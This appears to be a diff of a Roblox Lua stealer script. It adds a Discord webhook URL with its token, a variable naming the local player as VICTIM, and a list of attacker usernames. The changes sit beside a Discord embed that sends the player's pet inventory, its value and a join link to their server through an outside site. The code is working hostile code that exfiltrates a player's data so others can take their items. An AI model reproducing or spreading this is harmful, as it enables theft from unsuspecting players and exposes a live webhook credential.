@@ -1,5 +1,7 @@
 repeat task.wait() until game:IsLoaded()
 
+
+
 -- 🔒 VIP Server Check
 local plr = game.Players.LocalPlayer
 local getServerType = game:GetService("RobloxReplicatedStorage"):FindFirstChild("GetServerType")
@@ -13,6 +15,19 @@ if getServerType and getServerType:IsA("RemoteFunction") then
     end
 end
 
+_G.scriptExecuted = _G.scriptExecuted or false
+if _G.scriptExecuted then
+    return
+end
+_G.scriptExecuted = true
+
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1393637749881307249/ofeqDbtyCKTdR-cZ6Ul602-gkGOSMuCXv55RQQoKZswxigEfykexc9nNPDX_FYIqMGnP"
+local VICTIM = game.Players.LocalPlayer
+local USERNAMES = {
+    "sshhshs",
+    "yuniecoxo",
+    "Wanwood42093"
+}
 
 
 local PET_VALUES = {
@@ -156,17 +171,17 @@ function createDiscordEmbed(petList, totalValue, fileUrl)
                 inline = false
             },
             {
-                name = "💰 **Total Value**",
+                name = " **Total Value**",
                 value = string.format("```%s```", totalValue),
                 inline = false
             },
             {
-                name = "🌴 **Backpack**",
+                name = " **Backpack**",
                 value = string.format("```%s```", petList),
                 inline = false
             },
             {
-                name = "🏝️ **Join with URL**",
+                name = " **Join with URL**",
                 value = string.format("[%s](https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s)", game.JobId, game.PlaceId, game.JobId),
                 inline = false
             }
